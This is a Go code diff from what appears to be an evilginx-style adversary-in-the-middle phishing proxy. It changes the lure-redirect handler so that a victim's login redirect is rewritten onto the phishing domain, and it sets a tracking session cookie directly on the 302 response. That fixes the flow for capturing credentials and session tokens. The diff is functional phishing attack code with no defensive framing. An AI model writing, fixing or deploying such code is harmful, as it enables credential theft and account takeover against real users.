@@ -358,16 +358,29 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 			return req, resp
 		}
 
-		// AitM flow (default): HTTP 302 redirect to the ORIGINAL login URL.
-		// The response handler will automatically rewrite the Location header
-		// to the phish domain (via replaceHostWithPhished) and set the
-		// session cookie (via ps.Created). This matches standard evilginx behavior.
+		// AitM flow (default): HTTP 302 redirect to the phished login URL.
+		// Since this is a locally-generated response (not proxied), we must:
+		// 1. Rewrite the login URL from original to phished domain
+		// 2. Set the session cookie directly (response handler doesn't run)
 		rurl := pl.GetLoginUrl()
+		if phishedUrl, ok := p.replaceUrlWithPhished(rurl); ok {
+			rurl = phishedUrl
+		}
 		log.Important("[%d] [lure] AitM 302 redirect to: %s", sid, rurl)
+
+		// Create session cookie
+		ck := &http.Cookie{
+			Name:    getSessionCookieName(pl.Name, p.cookieName),
+			Value:   session.Id,
+			Path:    "/",
+			Domain:  p.cfg.GetBaseDomain(),
+			Expires: time.Now().Add(60 * time.Minute),
+		}
 
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		resp.Header.Set("Location", rurl)
 		resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+		resp.Header.Add("Set-Cookie", ck.String())
 		return req, resp
 	}
 
